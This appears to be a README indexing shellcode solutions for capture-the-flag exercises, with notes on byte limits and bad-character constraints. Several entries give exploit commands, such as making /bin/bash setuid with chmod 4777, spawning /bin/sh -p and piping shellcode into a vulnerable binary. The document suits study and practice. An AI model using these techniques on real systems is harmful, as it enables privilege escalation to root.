## Shellcodes

1. shellcode.105-59.s

    - avoid 0x48 in shellcode
    - `setuid` + `execve`

2. shellcode.59.s

    - if you cannot use syscall, sysenter, int
    - `execve("/bin//sh", ["/bin//sh", "-p", NULL], NULL)`

3. shellcode.2-0-1-60.s

    - open,read,write /flag

4. shellcode.90-60.s

    - chmod 777 /flag

5. shellcode.2-0-2-1.s

    - if u cannot use 0,1,2 file descriptors

6. shellcode.90.s
    
    - need to create symbolic link called "f"
    - 13 bytes long shellcode that helps u to read flag
    - don't worry if it shows u segfault error it still works

7. shellcode.59(2).s
    
    - echo -ne "#!/bin/bash -p\n/bin/bash -p" > f
    - 13 bytes long shellcode
    - (cat shellcode-raw;cat) | ./vuln

8. shellcode.105-59(2).s

    - echo -ne "#!/bin/bash\n/bin/bash" > f
    - 10 int3 instructions overwrite my shellcode after 10 bytes
    - gcc -nostdlib -static -z execstack shellcode.105-59(2).s -o shellcode
    - objcopy --dump-section .text=shellcode-raw shellcode
    - (cat shellcode-raw;cat) | ./vuln

9. shellcode.59(3).s

    - echo -ne "#!/bin/bash\nchmod 4777 /bin/bash" > f
    - all bytes are unique
    - 14 bytes long

10. shellcode.59(3).s

    - echo -ne "#!/bin/bash\nchmod 4777 /bin/bash" > f
    - 12 bytes long